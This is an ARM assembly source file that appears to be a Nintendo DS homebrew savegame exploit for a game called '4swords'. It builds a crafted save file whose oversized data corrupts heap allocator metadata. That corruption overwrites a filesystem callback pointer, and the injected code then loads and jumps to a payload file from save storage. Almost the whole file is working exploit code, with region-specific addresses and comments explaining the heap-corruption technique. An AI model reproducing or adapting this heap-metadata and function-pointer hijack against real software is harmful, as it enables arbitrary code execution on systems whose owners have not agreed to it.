.arch armv5te
.fpu softvfp
.eabi_attribute 23, 1
.eabi_attribute 24, 1
.eabi_attribute 25, 1
.eabi_attribute 26, 1
.eabi_attribute 30, 2
.eabi_attribute 18, 4

.global _start
.section .init
.arm

#define REGION_USA 45
#define REGION_EUR 56

#define	REG_BASE	0x04000000
#define	PAYLOAD_ADDR	0x02200000

#define FS_InitCtx 0x20102d4
#define	FS_Open 0x2010b1c
#define	FS_Close 0x2010ba0

#define	FS_Read 0x2010c84

#if REGCODE==REGION_USA
#define HEAPCTX_ADR 0x2177090
#define TARGET_FUNCPTR 0x20c90dc+0x24 //Adr of the func ptr to overwrite, this is some FS Open related callback for FATFS.(savedata) This is used soon after the heaphax.
#define TARGET_FUNCPTR_ORIGINALADR 0x02011e38 //Original address located at TARGET_FUNCPTR.

#elif REGCODE==REGION_EUR
#define HEAPCTX_ADR 0x21770b0
#define TARGET_FUNCPTR 0x20c90fc+0x24
#define TARGET_FUNCPTR_ORIGINALADR 0x02011e38
#else
#error "Unsupported region."
#endif

#define HEAP_NEXTCHUNKADR HEAPCTX_ADR+0x58
#define JUMPADR HEAP_NEXTCHUNKADR+0x10

_start:
.incbin "basesav.bin" @ This is the whole 0x800-byte actual save, with a modified playername.("HAXXXX") This save  checksum is invalid, but that's ignored since at least one of the save-files have a valid filesize.
@ 4swords has two savefiles, savedata/all.dat and savedata/backup.dat. When loading one fails,(in this case larger than normal filesize) it will fallback to loading the other savefile. It will then continue without error as long as loading one of the saves worked.(it will stop loading the save *after* it reads the save into memory with the filesize, when the filesize is too large. by then it's too late to stop haxx, it seems even if *both* saves were corrupted the attacked heap stuff below would still be used & exploited before their "corrupted save" delete+recreate code executes.)

.word 0, 0
.word HEAPCTX_ADR @ Adr of the next word. Starting with that adr, we overwrite a class with a vtable, but that class does not matter since it seems to be only used before loading the save.
.word 0 @ Without this padding, the title will overwrite heapctx+0x34 with a vtable ptr after the savedata was loaded.
.word 0 @ Without this here, the title would overwrite heapctx+0x24+12 with a vtable ptr.
.word HEAPCTX_ADR+4 @ This is actually a ptr to the heapctx.
.space 0x24 @ Heapctx here. No need to have correct data in this block when the alloc func works fine like this.
.word HEAP_NEXTCHUNKADR
.word 0
.word 0
.word TARGET_FUNCPTR-12 @ When allocating memory, for the below memchunk this is done: memchunk->prev = *(heapctx+0x24+12); memchunk->prev->next = memchunk; Thus, the data at TARGET_FUNCPTR will be overwritten with the adr of the below memchunk. Some data will be executed that's not code when it jumps there, but this doesn't cause any crash. 
.hword 0 @ padding
.hword 0 @ offset 0x36 in heapctx.

.space 0x50-0x34
@ nextchunk data goes here.
.word 0
.word 0x1000 @ Available free space when chunk is free, used space otherwise.
.word TARGET_FUNCPTR-12 @ prev memchunk ptr
.word JUMPADR @ next memchunk ptr


.align 2
code_start:
b code
.word 0
.word 0
.word 0 @ The data here will be overwritten by the memalloc code, so branch around it.
code:
orr	r0, pc, #1
bx	r0

.thumb
ldr r0, =TARGET_FUNCPTR @ Restore the overwritten funcptr with the original address.
ldr r1, =TARGET_FUNCPTR_ORIGINALADR
str r1, [r0]

mov r0, sp
ldr r4, =FS_InitCtx
blx r4

mov r0, sp
adr r1, payloadpath
mov r2, #1
ldr r4, =FS_Open
blx r4
cmp r0, #0
bne success

mov	r6, #0x1f
bl	gfxdisp
1:	b 1b

success:
mov r0, sp
ldr r1, =PAYLOAD_ADDR
mov r7, r1
ldr r2, =PAYLOAD_SIZE
ldr r4, =FS_Read
blx r4

mov r0, sp
ldr r4, =FS_Close
blx r4

blx DC_FlushAll
blx DC_InvalidateAll
blx IC_InvalidateAll

push	{r7}
ldr	r6, =0x3af3
bl	gfxdisp
pop	{pc}

gfxdisp:
ldr	r7, =REG_BASE
ldr	r1, =0x208
str	r7, [r7, r1]		@ IME = 0;
mov	r1, #0
ldr 	r5, =0x6c
strh	r1, [r7, r5]

ldr	r2, =0x1000 @ display stuff on the screens so you know for certain haxx is running on hw.(from cookhack)
add	r3, r2, r7
strh	r1, [r3, r5]

add	r2,r2,r7
mov	r0,r7
ldr	r3, =0x10100
str	r3, [r0]
str	r3, [r2]

ldr	r5, =0x200
str	r5, [r0, #0x08]
str	r5, [r2, #0x08]

ldr	r3, =0x240
add	r3, r3, r0
str	r1, [r0]
strh	r1, [r0, #0x04]
strb	r1, [r0, #0x06]
strb	r1, [r0, #0x08]
	
mov	r1, #0x81
strb	r1, [r0]
mov	r1, #0x84
strb	r1, [r0,#0x02]

ldr	r4, =0x05000000		@ engine A palette
str	r6, [r4]
ldr	r5, =0x400
str	r6, [r4, r5]		@ engine B palette
bx	lr

.pool
.align 2

.arm

DC_InvalidateAll:
.arm
mov r0, #0
mcr 15, 0, r0, cr7, cr6
bx lr

#define ICACHE_SIZE	0x2000
#define DCACHE_SIZE	0x1000
#define CACHE_LINE_SIZE	32

DC_FlushAll: @ From libnds, write buffer draining code was added by yellows8.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r1, #0
outer_loop:
	mov	r0, #0
inner_loop:
	orr	r2, r1, r0			@ generate segment and line address
	mcr	p15, 0, r2, c7, c14, 2		@ clean and flush the line
	add	r0, r0, #CACHE_LINE_SIZE
	cmp	r0, #DCACHE_SIZE/4
	bne	inner_loop
	add	r1, r1, #0x40000000
	cmp	r1, #0
	bne	outer_loop
	mov r0, #0
	mcr 15, 0, r0, cr7, cr10, 4 @ Drain write buffer.
	bx	lr

IC_InvalidateAll: @ From libnds.
/*---------------------------------------------------------------------------------
	Clean and invalidate entire data cache
---------------------------------------------------------------------------------*/
	mov	r0, #0
	mcr	p15, 0, r0, c7, c5, 0
	bx	lr

payloadpath:
.string "dataPub:/savedata/payload.dat"
.align 2
